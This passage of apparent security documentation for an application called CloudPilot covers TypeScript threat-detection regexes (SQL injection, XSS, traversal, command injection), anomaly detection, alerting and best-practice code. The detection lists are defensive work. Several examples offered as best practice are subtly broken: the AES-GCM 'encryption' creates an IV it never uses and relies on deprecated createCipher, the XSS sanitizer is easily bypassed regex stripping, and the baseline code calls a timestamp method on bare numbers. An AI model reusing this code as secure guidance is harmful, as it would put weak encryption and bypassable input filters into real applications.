│  └─────────────┘  └─────────────┘  └─────────────┘         │
└─────────────────────────────────────────────────────────────┘
```

### Pattern Matching System

#### Threat Patterns Configuration

```typescript
const threatPatterns: ThreatPattern[] = [
  // SQL Injection Patterns
  {
    id: 'sql-injection-1',
    name: 'Basic SQL Injection',
    pattern: /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)\b.*\b(WHERE|FROM|TABLE)\b)/i,
    severity: 'high',
    category: 'injection',
    enabled: true
  },
  {
    id: 'sql-injection-2',
    name: 'SQL Comment Injection',
    pattern: /(--|\/\*|\*\/)/,
    severity: 'medium',
    category: 'injection',
    enabled: true
  },
  
  // XSS Patterns
  {
    id: 'xss-1',
    name: 'Script Tag Injection',
    pattern: /<script[^>]*>.*?<\/script>/gi,
    severity: 'high',
    category: 'xss',
    enabled: true
  },
  {
    id: 'xss-2',
    name: 'JavaScript Protocol',
    pattern: /javascript:/gi,
    severity: 'high',
    category: 'xss',
    enabled: true
  },
  {
    id: 'xss-3',
    name: 'Event Handler Injection',
    pattern: /on\w+="[^"]*"/gi,
    severity: 'high',
    category: 'xss',
    enabled: true
  },
  
  // Path Traversal
  {
    id: 'path-traversal-1',
    name: 'Directory Traversal',
    pattern: /(\.\.\/)+/g,
    severity: 'medium',
    category: 'traversal',
    enabled: true
  },
  {
    id: 'path-traversal-2',
    name: 'Windows Path Traversal',
    pattern: /(\.\.\\)+/g,
    severity: 'medium',
    category: 'traversal',
    enabled: true
  },
  
  // Command Injection
  {
    id: 'command-injection-1',
    name: 'Shell Command Injection',
    pattern: /[;&|`$]/,
    severity: 'high',
    category: 'injection',
    enabled: true
  },
  {
    id: 'command-injection-2',
    name: 'Command Chaining',
    pattern: /&&|\|\|/,
    severity: 'high',
    category: 'injection',
    enabled: true
  },
  
  // File Inclusion
  {
    id: 'file-inclusion-1',
    name: 'Local File Inclusion',
    pattern: /(\.\.\/|\.\.\\)/,
    severity: 'high',
    category: 'inclusion',
    enabled: true
  },
  {
    id: 'file-inclusion-2',
    name: 'Remote File Inclusion',
    pattern: /(https?:\/\/|ftp:\/\/)/i,
    severity: 'medium',
    category: 'inclusion',
    enabled: false // Enable for specific use cases
  },
  
  // NoSQL Injection
  {
    id: 'nosql-injection-1',
    name: 'MongoDB NoSQL Injection',
    pattern: /\$where|\$ne|\$gt|\$lt|\$regex/i,
    severity: 'high',
    category: 'injection',
    enabled: true
  }
];
```

### Behavioral Analysis

```typescript
interface BehavioralAnalysisConfig {
  enabled: boolean;
  baselineWindow: number; // hours
  deviationThreshold: number; // standard deviations
  metricsToTrack: string[];
}

const behavioralConfig: BehavioralAnalysisConfig = {
  enabled: true,
  baselineWindow: 24, // Track for 24 hours
  deviationThreshold: 2, // Flag deviations > 2 standard deviations
  metricsToTrack: [
    'login_attempts',
    'requests_per_minute',
    'data_access_volume',
    'error_rate',
    'response_time',
    'concurrent_sessions'
  ]
};

// Behavioral baseline tracking
class BehavioralBaseline {
  private metrics: Map<string, number[]> = new Map();
  private config: BehavioralAnalysisConfig;
  
  updateMetric(metricName: string, value: number): void {
    if (!this.metrics.has(metricName)) {
      this.metrics.set(metricName, []);
    }
    
    const values = this.metrics.get(metricName)!;
    values.push(value);
    
    // Keep only values within baseline window
    const cutoff = Date.now() - (this.config.baselineWindow * 60 * 60 * 1000);
    while (values.length > 0 && this.getTimestamp(values[0]) < cutoff) {
      values.shift();
    }
  }
  
  detectAnomaly(metricName: string, currentValue: number): AnomalyResult | null {
    const baseline = this.metrics.get(metricName);
    if (!baseline || baseline.length < 10) {
      return null; // Need minimum baseline data
    }
    
    const mean = baseline.reduce((a, b) => a + b, 0) / baseline.length;
    const variance = baseline.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / baseline.length;
    const stdDev = Math.sqrt(variance);
    const zScore = Math.abs(currentValue - mean) / stdDev;
    
    if (zScore > this.config.deviationThreshold) {
      return {
        metricName,
        currentValue,
        expectedValue: mean,
        deviation: zScore,
        severity: zScore > this.config.deviationThreshold * 2 ? 'high' : 'medium',
        timestamp: new Date()
      };
    }
    
    return null;
  }
}
```

### Anomaly Detection

```typescript
interface AnomalyDetectionConfig {
  enabled: boolean;
  algorithm: 'isolation-forest' | 'statistical' | 'ml-based';
  sensitivity: number; // 0-1
  updateFrequency: number; // hours
}

const anomalyConfig: AnomalyDetectionConfig = {
  enabled: true,
  algorithm: 'statistical',
  sensitivity: 0.7,
  updateFrequency: 6
};

// Anomaly detection implementation
class AnomalyDetector {
  private dataPoints: Map<string, number[]> = new Map();
  private config: AnomalyDetectionConfig;
  
  addDataPoint(metric: string, value: number, timestamp: number): void {
    if (!this.dataPoints.has(metric)) {
      this.dataPoints.set(metric, []);
    }
    
    const points = this.dataPoints.get(metric)!;
    points.push(value);
    
    // Maintain sliding window
    const maxPoints = 1000;
    if (points.length > maxPoints) {
      points.shift();
    }
  }
  
  detectAnomalies(): AnomalyResult[] {
    const anomalies: AnomalyResult[] = [];
    
    for (const [metric, values] of this.dataPoints.entries()) {
      if (values.length < 20) continue; // Need minimum data
      
      const currentValue = values[values.length - 1];
      const recentValues = values.slice(-20); // Last 20 points
      
      const mean = recentValues.reduce((a, b) => a + b, 0) / recentValues.length;
      const stdDev = this.calculateStdDev(recentValues, mean);
      
      // Detect statistical anomalies
      const zScore = Math.abs(currentValue - mean) / stdDev;
      if (zScore > (1 / this.config.sensitivity)) {
        anomalies.push({
          metricName: metric,
          currentValue,
          expectedValue: mean,
          deviation: zScore,
          severity: zScore > 3 ? 'high' : 'medium',
          timestamp: new Date()
        });
      }
      
      // Detect sudden spikes
      const prevValue = values[values.length - 2];
      const spikeThreshold = mean * 2;
      if (Math.abs(currentValue - prevValue) > spikeThreshold) {
        anomalies.push({
          metricName: `${metric}_spike`,
          currentValue,
          expectedValue: mean,
          deviation: Math.abs(currentValue - prevValue) / mean,
          severity: 'medium',
          timestamp: new Date()
        });
      }
    }
    
    return anomalies;
  }
  
  private calculateStdDev(values: number[], mean: number): number {
    const variance = values.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / values.length;
    return Math.sqrt(variance);
  }
}
```

### Response Actions

```typescript
interface ThreatResponseAction {
  threatType: string;
  severity: string;
  actions: string[];
  autoBlock: boolean;
  alertAdmins: boolean;
  rateLimitAdjustment?: number;
}

const responseActions: ThreatResponseAction[] = [
  {
    threatType: 'sql-injection',
    severity: 'high',
    actions: ['block_request', 'log_security_event', 'alert_admins', 'increase_rate_limit'],
    autoBlock: true,
    alertAdmins: true,
    rateLimitAdjustment: 0.5 // Reduce rate limit by 50%
  },
  {
    threatType: 'xss',
    severity: 'high',
    actions: ['sanitize_input', 'log_security_event', 'alert_admins'],
    autoBlock: false,
    alertAdmins: true
  },
  {
    threatType: 'path-traversal',
    severity: 'medium',
    actions: ['block_request', 'log_security_event'],
    autoBlock: true,
    alertAdmins: false
  },
  {
    threatType: 'command-injection',
    severity: 'critical',
    actions: ['block_request', 'log_security_event', 'alert_admins', 'ban_ip'],
    autoBlock: true,
    alertAdmins: true
  },
  {
    threatType: 'suspicious_behavior',
    severity: 'medium',
    actions: ['increase_monitoring', 'log_security_event'],
    autoBlock: false,
    alertAdmins: false
  }
];
```

### Threat Detection Middleware

```typescript
export function threatDetectionMiddleware(req: Request, res: Response, next: NextFunction) {
  const securityManager = defaultSecurityConfigManager;
  
  // Combine all inputs for analysis
  const allInputs = [
    JSON.stringify(req.body || {}),
    JSON.stringify(req.query || {}),
    JSON.stringify(req.params || {}),
    req.headers['user-agent'] || '',
    req.headers['referer'] || '',
    req.originalUrl
  ].join(' ');
  
  // Analyze for threats
  const threats = securityManager.analyzeThreats(allInputs);
  
  if (threats.length > 0) {
    // Handle each threat
    for (const threat of threats) {
      handleThreatDetected(req, res, threat);
    }
    return; // Don't continue processing
  }
  
  next();
}

function handleThreatDetected(req: Request, res: Response, threat: ThreatDetectionResult): void {
  // Get response action
  const responseAction = getResponseAction(threat.category, threat.severity);
  
  // Create security event
  const securityEvent = defaultSecurityConfigManager.createSecurityEvent({
    type: SecurityEventType.THREAT_DETECTED,
    severity: threat.severity,
    source: 'threat-detection',
    description: `Threat detected: ${threat.patternName}`,
    metadata: {
      threat,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      url: req.originalUrl,
      responseAction
    }
  });
  
  // Execute response actions
  for (const action of responseAction.actions) {
    switch (action) {
      case 'block_request':
        res.status(400).json({
          error: 'Request blocked due to security policy violation',
          eventId: securityEvent.id
        });
        return;
        
      case 'sanitize_input':
        sanitizeRequestInputs(req);
        break;
        
      case 'alert_admins':
        alertAdministrators(securityEvent);
        break;
        
      case 'ban_ip':
        banIpAddress(req.ip, responseAction.severity);
        break;
        
      case 'increase_rate_limit':
        adjustRateLimit(req.ip, responseAction.rateLimitAdjustment);
        break;
        
      case 'increase_monitoring':
        increaseMonitoringForUser(req.ip);
        break;
    }
  }
}
```

### Real-time Monitoring

```typescript
// Continuous threat monitoring
setInterval(() => {
  const anomalies = anomalyDetector.detectAnomalies();
  
  for (const anomaly of anomalies) {
    defaultSecurityConfigManager.createSecurityEvent({
      type: SecurityEventType.ANOMALY_DETECTED,
      severity: anomaly.severity,
      source: 'anomaly-detection',
      description: `Anomaly detected in ${anomaly.metricName}`,
      metadata: anomaly
    });
  }
}, 60000); // Check every minute

// Behavioral baseline updates
setInterval(() => {
  updateBehavioralBaseline();
  cleanupOldData();
}, 6 * 60 * 60 * 1000); // Every 6 hours
```

### Threat Intelligence Integration

```typescript
// IP reputation checking
async function checkIpReputation(ip: string): Promise<ReputationResult> {
  try {
    const response = await fetch(`https://api.reputation.com/check/${ip}`);
    const data = await response.json();
    
    return {
      ip,
      reputation: data.reputation,
      threatTypes: data.threats,
      lastSeen: data.lastSeen,
      confidence: data.confidence
    };
  } catch (error) {
    // Log error but don't fail
    return { ip, reputation: 'unknown', threatTypes: [], confidence: 0 };
  }
}

// Malware scanning
async function scanForMalware(input: string): Promise<MalwareScanResult> {
  const malwarePatterns = [
    /<iframe[^>]*src=["']?javascript:/i,
    /eval\s*\(/,
    /document\.write\s*\(/,
    /\.exec\s*\(/,
    /base64_decode/i,
    /eval\s*\(\s*base64_decode/i
  ];
  
  const matches = malwarePatterns
    .map((pattern, index) => ({ pattern, index, match: input.match(pattern) }))
    .filter(result => result.match);
  
  return {
    isClean: matches.length === 0,
    matches: matches.map(m => ({
      patternIndex: m.index,
      matchedText: m.match![0]
    }))
  };
}
```

### Best Practices

1. **Multi-layered Detection**: Combine pattern matching, behavioral analysis, and anomaly detection
2. **Tunable Sensitivity**: Adjust detection sensitivity based on environment and risk tolerance
3. **False Positive Management**: Implement whitelisting and learning mechanisms
4. **Response Automation**: Automate appropriate responses to reduce reaction time
5. **Continuous Learning**: Update patterns and thresholds based on new threats
6. **Integration**: Integrate with external threat intelligence feeds
7. **Logging**: Comprehensive logging for forensic analysis
8. **Performance**: Monitor detection performance to avoid impact on response times

---

## Security Monitoring

Security monitoring provides real-time visibility into the security posture of the application, tracking threats, events, and compliance metrics.

### Monitoring Components

#### 1. Health Check Endpoints

##### Security Health Endpoint
```typescript
// GET /api/security/health
{
  status: 'healthy',
  timestamp: '2025-10-31T05:58:13.000Z',
  components: {
    securityHeaders: { status: 'active', configured: true },
    rateLimiting: { status: 'active', totalRequests: 15420, blockedRequests: 234 },
    inputValidation: { status: 'active', validatedRequests: 15420, failedValidations: 45 },
    sqlProtection: { status: 'active', queriesAnalyzed: 8920, threatsDetected: 12 },
    threatDetection: { status: 'active', patternsLoaded: 15, lastDetection: '2025-10-31T05:55:12.000Z' }
  },
  metrics: {
    uptime: 86400,
    requestsPerSecond: 2.5,
    securityEventsPerHour: 8,
    averageResponseTime: 145
  },
  threats: {
    last24Hours: 23,
    bySeverity: {
      low: 15,
      medium: 6,
      high: 2,
      critical: 0
    },
    byCategory: {
      injection: 8,
      xss: 5,
      traversal: 4,
      behavioral: 6
    }
  },
  compliance: {
    score: 94,
    frameworks: {
      soc2: { compliant: true, score: 96 },
      iso27001: { compliant: true, score: 93 },
      gdpr: { compliant: true, score: 95 }
    }
  }
}
```

##### Enhanced Monitoring Status
```typescript
// GET /api/monitoring/status
{
  status: 'operational',
  timestamp: '2025-10-31T05:58:13.000Z',
  services: {
    database: { status: 'healthy', responseTime: 45 },
    cache: { status: 'healthy', hitRate: 87 },
    storage: { status: 'healthy', usage: '23%' }
  },
  security: {
    status: 'active',
    lastThreat: '2025-10-31T05:55:12.000Z',
    threatsBlocked: 234,
    rateLimitHits: 45,
    invalidRequests: 12
  },
  performance: {
    uptime: 86400,
    requestsPerSecond: 2.5,
    errorRate: 0.02,
    averageResponseTime: 145
  }
}
```

#### 2. Real-time Metrics

```typescript
interface SecurityMetrics {
  timestamp: number;
  requests: {
    total: number;
    blocked: number;
    rateLimited: number;
    malicious: number;
  };
  threats: {
    detected: number;
    blocked: number;
    byType: Record<string, number>;
    bySeverity: Record<string, number>;
  };
  authentication: {
    attempts: number;
    failures: number;
    lockouts: number;
    sessionTimeout: number;
  };
  performance: {
    responseTime: number;
    throughput: number;
    errorRate: number;
  };
}

// Metrics collection
class SecurityMetricsCollector {
  private metrics: SecurityMetrics = {
    timestamp: Date.now(),
    requests: { total: 0, blocked: 0, rateLimited: 0, malicious: 0 },
    threats: { detected: 0, blocked: 0, byType: {}, bySeverity: {} },
    authentication: { attempts: 0, failures: 0, lockouts: 0, sessionTimeout: 0 },
    performance: { responseTime: 0, throughput: 0, errorRate: 0 }
  };
  
  recordRequest(allowed: boolean, threat?: string): void {
    this.metrics.requests.total++;
    
    if (!allowed) {
      this.metrics.requests.blocked++;
    }
    
    if (threat) {
      this.metrics.requests.malicious++;
      this.metrics.threats.detected++;
      
      // Update threat type tracking
      this.metrics.threats.byType[threat] = (this.metrics.threats.byType[threat] || 0) + 1;
    }
  }
  
  recordThreat(severity: string, category: string): void {
    this.metrics.threats.detected++;
    this.metrics.threats.bySeverity[severity] = 
      (this.metrics.threats.bySeverity[severity] || 0) + 1;
    this.metrics.threats.byType[category] = 
      (this.metrics.threats.byType[category] || 0) + 1;
  }
  
  getMetrics(): SecurityMetrics {
    return { ...this.metrics };
  }
  
  resetMetrics(): void {
    this.metrics = {
      timestamp: Date.now(),
      requests: { total: 0, blocked: 0, rateLimited: 0, malicious: 0 },
      threats: { detected: 0, blocked: 0, byType: {}, bySeverity: {} },
      authentication: { attempts: 0, failures: 0, lockouts: 0, sessionTimeout: 0 },
      performance: { responseTime: 0, throughput: 0, errorRate: 0 }
    };
  }
}
```

#### 3. Dashboard Integration

```typescript
// Security dashboard data
app.get('/api/security/dashboard', (req, res) => {
  const metrics = metricsCollector.getMetrics();
  const threats = getRecentThreats(24); // Last 24 hours
  const compliance = securityManager.enforceBestPractices();
  
  res.json({
    overview: {
      status: 'secure',
      threatLevel: calculateThreatLevel(metrics.threats),
      complianceScore: compliance.score,
      uptime: getUptime()
    },
    metrics,
    recentThreats: threats.slice(0, 10), // Latest 10 threats
    alerts: getActiveAlerts(),
    recommendations: compliance.recommendations
  });
});

// WebSocket for real-time updates
const io = require('socket.io')(server);

io.on('connection', (socket) => {
  // Send initial dashboard data
  socket.emit('dashboard:init', getDashboardData());
  
  // Subscribe to security events
  defaultSecurityConfigManager.on('securityEvent', (event) => {
    socket.emit('security:event', event);
  });
  
  // Subscribe to metrics updates
  setInterval(() => {
    socket.emit('metrics:update', metricsCollector.getMetrics());
  }, 5000);
});
```

#### 4. Alerting System

```typescript
// Alert configuration
interface AlertConfig {
  id: string;
  name: string;
  condition: AlertCondition;
  severity: 'low' | 'medium' | 'high' | 'critical';
  enabled: boolean;
  channels: AlertChannel[];
}

interface AlertCondition {
  metric: string;
  operator: '>' | '<' | '=' | '!=' | '>=' | '<=';
  threshold: number;
  duration?: number; // Time above threshold before alert
}

// Alert channels
interface AlertChannel {
  type: 'email' | 'slack' | 'webhook' | 'sms';
  config: {
    email?: string;
    webhookUrl?: string;
    phoneNumber?: string;
  };
}

// Alert rules
const alertRules: AlertConfig[] = [
  {
    id: 'high-threat-rate',
    name: 'High Threat Detection Rate',
    condition: { metric: 'threats.detected', operator: '>', threshold: 10 },
    severity: 'high',
    enabled: true,
    channels: [
      { type: 'slack', config: { webhookUrl: process.env.SLACK_WEBHOOK_URL } },
      { type: 'email', config: { email: 'security@company.com' } }
    ]
  },
  {
    id: 'authentication-failures',
    name: 'Excessive Authentication Failures',
    condition: { metric: 'auth.failures', operator: '>', threshold: 50 },
    severity: 'medium',
    enabled: true,
    channels: [
      { type: 'email', config: { email: 'ops@company.com' } }
    ]
  },
  {
    id: 'compliance-score-drop',
    name: 'Compliance Score Drop',
    condition: { metric: 'compliance.score', operator: '<', threshold: 90 },
    severity: 'high',
    enabled: true,
    channels: [
      { type: 'email', config: { email: 'compliance@company.com' } },
      { type: 'webhook', config: { webhookUrl: process.env.COMPLIANCE_WEBHOOK } }
    ]
  }
];

// Alert processor
class AlertProcessor {
  private activeAlerts: Map<string, AlertState> = new Map();
  
  checkAlerts(metrics: SecurityMetrics): void {
    for (const rule of alertRules) {
      if (!rule.enabled) continue;
      
      const value = this.getMetricValue(metrics, rule.condition.metric);
      const triggered = this.evaluateCondition(value, rule.condition);
      
      if (triggered) {
        this.handleAlertTriggered(rule, value);
      } else {
        this.handleAlertResolved(rule);
      }
    }
  }
  
  private handleAlertTriggered(rule: AlertConfig, value: number): void {
    const alertId = rule.id;
    const existingAlert = this.activeAlerts.get(alertId);
    
    if (!existingAlert) {
      // New alert
      const alert: AlertState = {
        ruleId: rule.id,
        triggeredAt: Date.now(),
        value,
        acknowledged: false
      };
      
      this.activeAlerts.set(alertId, alert);
      this.sendAlerts(rule, alert);
    }
  }
  
  private sendAlerts(rule: AlertConfig, alert: AlertState): void {
    for (const channel of rule.channels) {
      this.sendAlertToChannel(channel, rule, alert);
    }
  }
  
  private async sendAlertToChannel(
    channel: AlertChannel, 
    rule: AlertConfig, 
    alert: AlertState
  ): Promise<void> {
    const message = this.formatAlertMessage(rule, alert);
    
    switch (channel.type) {
      case 'email':
        await sendEmail(channel.config.email!, message);
        break;
        
      case 'slack':
        await sendSlackMessage(channel.config.webhookUrl!, message);
        break;
        
      case 'webhook':
        await sendWebhook(channel.config.webhookUrl!, message);
        break;
    }
  }
}
```

#### 5. Log Aggregation

```typescript
// Security event logging
interface SecurityLog {
  timestamp: number;
  level: 'info' | 'warning' | 'error' | 'critical';
  event: SecurityEvent;
  context: {
    requestId: string;
    userId?: string;
    ip: string;
    userAgent?: string;
    url: string;
  };
}

// Log writer
class SecurityLogWriter {
  private logs: SecurityLog[] = [];
  private maxLogs = 10000;
  
  write(log: SecurityLog): void {
    this.logs.push(log);
    
    // Write to various outputs
    this.writeToConsole(log);
    this.writeToFile(log);
    this.sendToLogAggregator(log);
    
    // Maintain log size
    if (this.logs.length > this.maxLogs) {
      this.logs = this.logs.slice(-this.maxLogs);
    }
  }
  
  private writeToConsole(log: SecurityLog): void {
    const message = `[${new Date(log.timestamp).toISOString()}] [${log.level.toUpperCase()}] ${log.event.description}`;
    console.log(message);
  }
  
  private writeToFile(log: SecurityLog): void {
    const logFile = `./logs/security-${new Date().toISOString().split('T')[0]}.log`;
    const logLine = JSON.stringify(log) + '\n';
    fs.appendFileSync(logFile, logLine);
  }
  
  private sendToLogAggregator(log: SecurityLog): void {
    // Send to ELK stack, Splunk, or other log aggregation service
    fetch(process.env.LOG_AGGREGATOR_URL!, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(log)
    }).catch(err => {
      console.error('Failed to send log to aggregator:', err);
    });
  }
}
```

### Monitoring Best Practices

1. **Multi-layered Monitoring**: Monitor at application, infrastructure, and network levels
2. **Real-time Alerts**: Implement immediate alerting for critical security events
3. **Metric Correlation**: Correlate different metrics to identify complex attack patterns
4. **Baseline Establishment**: Establish normal behavior baselines for anomaly detection
5. **Retention Policies**: Define appropriate log and metric retention periods
6. **Dashboard Automation**: Automatically update dashboards with real-time data
7. **Alert Fatigue Prevention**: Tune alert thresholds to avoid false positives
8. **Forensic Readiness**: Ensure logs contain sufficient detail for incident response

---

## Best Practices

This section outlines security best practices for development, deployment, and maintenance of the CloudPilot application.

### Development Best Practices

#### 1. Secure Coding Principles

```typescript
// Principle of Least Privilege
class SecureUserService {
  // User can only access their own data
  async getUserData(userId: string, requesterId: string): Promise<UserData> {
    // Explicit authorization check
    if (userId !== requesterId) {
      throw new AuthorizationError('Access denied');
    }
    
    // Proceed with data retrieval
    return await this.database.getUserData(userId);
  }
}

// Input Sanitization at Boundaries
function sanitizeUserInput(input: any): any {
  if (typeof input === 'string') {
    return input
      .trim()
      .replace(/<script[^>]*>.*?<\/script>/gi, '')
      .replace(/javascript:/gi, '');
  }
  
  if (Array.isArray(input)) {
    return input.map(sanitizeUserInput);
  }
  
  if (typeof input === 'object' && input !== null) {
    const sanitized: any = {};
    for (const [key, value] of Object.entries(input)) {
      sanitized[key] = sanitizeUserInput(value);
    }
    return sanitized;
  }
  
  return input;
}

// Error Handling Without Information Leakage
function handleError(error: Error, req: Request, res: Response): void {
  // Log detailed error for debugging
  logger.error('Error occurred', {
    error: error.message,
    stack: error.stack,
    requestId: req.headers['x-request-id'],
    userId: req.user?.id,
    ip: req.ip
  });
  
  // Return generic error to client
  res.status(500).json({
    error: 'An unexpected error occurred',
    requestId: req.headers['x-request-id']
  });
}
```

#### 2. Authentication & Authorization

```typescript
// Multi-Factor Authentication
class MFAService {
  async verifyMFA(userId: string, token: string): Promise<boolean> {
    const secret = await this.getMFASecret(userId);
    const isValid = speakeasy.totp.verify({
      secret,
      encoding: 'base32',
      token,
      window: 2
    });
    
    if (isValid) {
      // Log successful MFA verification
      await this.auditLogger.log('mfa_verification_success', { userId });
    } else {
      // Log failed attempt
      await this.auditLogger.log('mfa_verification_failure', { userId });
    }
    
    return isValid;
  }
}

// Role-Based Access Control
class AuthorizationService {
  async authorize(
    userId: string, 
    resource: string, 
    action: string, 
    context?: any
  ): Promise<boolean> {
    const userRoles = await this.getUserRoles(userId);
    const resourcePermissions = await this.getResourcePermissions(resource);
    
    // Check if user has required role
    const hasPermission = userRoles.some(role => 
      resourcePermissions[role]?.includes(action)
    );
    
    // Additional context checks
    if (hasPermission && context) {
      return this.checkContextualPermissions(userId, resource, context);
    }
    
    return hasPermission;
  }
  
  private async checkContextualPermissions(
    userId: string, 
    resource: string, 
    context: any
  ): Promise<boolean> {
    // Example: User can only access their own resources
    if (context.ownerId && context.ownerId !== userId) {
      return false;
    }
    
    // Example: Department-based access
    if (context.department && !await this.checkDepartmentAccess(userId, context.department)) {
      return false;
    }
    
    return true;
  }
}
```

#### 3. Data Protection

```typescript
// Encryption at Rest
class DataEncryptionService {
  private algorithm = 'aes-256-gcm';
  
  async encrypt(plaintext: string, key: string): Promise<string> {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher(this.algorithm, key);
    cipher.setAAD(Buffer.from('additional-data'));
    
    let encrypted = cipher.update(plaintext, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
  }
  
  async decrypt(encryptedData: string, key: string): Promise<string> {
    const [ivHex, authTagHex, encrypted] = encryptedData.split(':');
    
    const iv = Buffer.from(ivHex, 'hex');
    const authTag = Buffer.from(authTagHex, 'hex');
    const decipher = crypto.createDecipher(this.algorithm, key);
    decipher.setAAD(Buffer.from('additional-data'));
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}

// Secure Data Transmission
function secureAjaxRequest(url: string, data: any, headers: any = {}): Promise<any> {
  // Add security headers
  const securityHeaders = {
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json',
    ...headers
  };
  
  return fetch(url, {
    method: 'POST',
    headers: securityHeaders,
    body: JSON.stringify(data),
    credentials: 'include', // Include cookies for authenticated requests
    cache: 'no-cache' // Prevent caching of sensitive data
  });
}
```

#### 4. Session Management

```typescript
// Secure Session Handling
class SessionService {
  async createSession(userId: string, req: Request): Promise<string> {
    const sessionId = crypto.randomBytes(32).toString('hex');
    const sessionData = {
      userId,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      createdAt: Date.now(),
      lastActivity: Date.now()
    };
    
    await this.redis.setex(
      `session:${sessionId}`,
      this.config.sessionTimeout,
      JSON.stringify(sessionData)
    );
    
    return sessionId;
  }
  
  async validateSession(sessionId: string): Promise<SessionData | null> {
    const sessionData = await this.redis.get(`session:${sessionId}`);
    
    if (!sessionData) {
      return null;
    }
    
    const session = JSON.parse(sessionData);
    
    // Check session timeout
    if (Date.now() - session.lastActivity > this.config.sessionTimeout * 1000) {
      await this.invalidateSession(sessionId);
      return null;
    }
    
    // Update last activity
    session.lastActivity = Date.now();
    await this.redis.setex(
      `session:${sessionId}`,
      this.config.sessionTimeout,
      JSON.stringify(session)
    );
    
    return session;
  }
  
  async invalidateSession(sessionId: string): Promise<void> {
    await this.redis.del(`session:${sessionId}`);
  }
}
```

### Deployment Best Practices

#### 1. Environment Configuration

```typescript
// Environment-specific configuration
const configurations = {
  development: {
    logging: { level: 'debug' },
    security: {
      rateLimiting: { enabled: false },
      hsts: { enabled: false },
      cors: { origin: '*' }
    }
  },
  
  production: {
    logging: { level: 'info' },
    security: {
      rateLimiting: { enabled: true },
      hsts: { enabled: true, maxAge: 31536000 },
      cors: { 
        origin: process.env.ALLOWED_ORIGINS?.split(',') || [],
        credentials: true
      }
    }
  }
};

const config = configurations[process.env.NODE_ENV || 'development'];
```

#### 2. Infrastructure Security

```yaml
# Kubernetes security configuration
apiVersion: v1
kind: Pod
metadata:
  name: cloudpilot
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
  containers:
  - name: cloudpilot
    image: cloudpilot:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
    env:
    - name: NODE_ENV
      value: "production"
    - name: DATABASE_URL
      valueFrom:
        secretKeyRef:
          name: app-secrets
          key: database-url
    resources:
      limits:
        memory: "512Mi"
        cpu: "500m"
      requests:
        memory: "256Mi"
        cpu: "250m"
```

#### 3. SSL/TLS Configuration

```typescript
// Secure server configuration
const serverConfig = {
  https: {
    key: fs.readFileSync('./certs/private-key.pem'),
    cert: fs.readFileSync('./certs/certificate.pem'),
    ca: fs.readFileSync('./certs/ca-bundle.pem'),
    // Enforce modern TLS versions
    minVersion: 'TLSv1.2',
    // Prefer server cipher order
    honorCipherOrder: true,
    // Strong cipher suites
    ciphers: [
      'ECDHE-RSA-AES256-GCM-SHA384',
      'ECDHE-RSA-AES128-GCM-SHA256',
      'ECDHE-RSA-AES256-SHA384',
      'ECDHE-RSA-AES128-SHA256'
    ].join(':')
  }
};
```

### Maintenance Best Practices

#### 1. Security Updates

```typescript
// Automated dependency scanning
class DependencyScanner {
  async scanVulnerabilities(): Promise<VulnerabilityReport> {
    const dependencies = await this.getInstalledDependencies();
    const vulnerabilities = [];
    
    for (const dep of dependencies) {
      const vuln = await this.checkNationalVulnerabilityDatabase(dep.name, dep.version);
      if (vuln) {
        vulnerabilities.push(vuln);
      }
    }
    
    return {
      totalDependencies: dependencies.length,
      vulnerableDependencies: vulnerabilities.length,
      vulnerabilities,
      scanDate: new Date()
    };
  }
  
  async scheduleSecurityUpdates(): Promise<void> {
    const cronJob = cron.schedule('0 2 * * 0', async () => {
      console.log('Running weekly security scan...');
      const report = await this.scanVulnerabilities();
      
      if (report.vulnerableDependencies > 0) {
        await this.notifySecurityTeam(report);
        await this.createPullRequestForUpdates(report);
      }
    });
  }
}
```

#### 2. Security Auditing

```typescript
// Regular security audits
class SecurityAuditor {
  async performSecurityAudit(): Promise<SecurityAuditReport> {
    const results = {
      authentication: await this.auditAuthentication(),
      authorization: await this.auditAuthorization(),
      dataProtection: await this.auditDataProtection(),
      inputValidation: await this.auditInputValidation(),
      sessionManagement: await this.auditSessionManagement(),
      errorHandling: await this.auditErrorHandling(),
      logging: await this.auditLogging(),
      configuration: await this.auditConfiguration()
    };
    
    const overallScore = this.calculateOverallScore(results);
    
    return {
      timestamp: new Date(),
      overallScore,
      results,
      recommendations: this.generateRecommendations(results)
    };
  }
  
  private async auditAuthentication(): Promise<AuditResult> {
    const checks = {
      mfaEnabled: await this.checkMFAEnabled(),
      passwordPolicy: await this.checkPasswordPolicy(),
      sessionTimeout: await this.checkSessionTimeout(),
      lockoutPolicy: await this.checkLockoutPolicy()
    };
    
    return {
      score: Object.values(checks).filter(Boolean).length / Object.keys(checks).length * 100,
      details: checks
    };
  }
}
```

#### 3. Incident Response

```typescript
// Incident response procedures
class IncidentResponseService {
  async handleSecurityIncident(incident: SecurityIncident): Promise<void> {
    // Immediate containment
    await this.containIncident(incident);
    
    // Notification
    await this.notifyStakeholders(incident);
    
    // Investigation
    const investigation = await this.investigateIncident(incident);
    
    // Resolution
    await this.resolveIncident(incident, investigation);
    
    // Post-incident review
    await this.performPostIncidentReview(incident, investigation);
  }
  
  private async containIncident(incident: SecurityIncident): Promise<void> {
    switch (incident.severity) {
      case 'critical':
        // Block all requests
        await this.enableEmergencyMode();
        break;
        
      case 'high':
        // Increase monitoring
        await this.increaseMonitoring();
        // Block suspicious IP addresses
        await this.blockSuspiciousIPs(incident.relatedIPs);
        break;
        
      case 'medium':
        // Enhanced logging
        await this.enhanceLogging();
        break;
    }
  }
}
```

### General Best Practices

1. **Defense in Depth**: Implement multiple layers of security controls
2. **Fail Securely**: Design systems to fail in a secure state
3. **Zero Trust**: Never trust, always verify
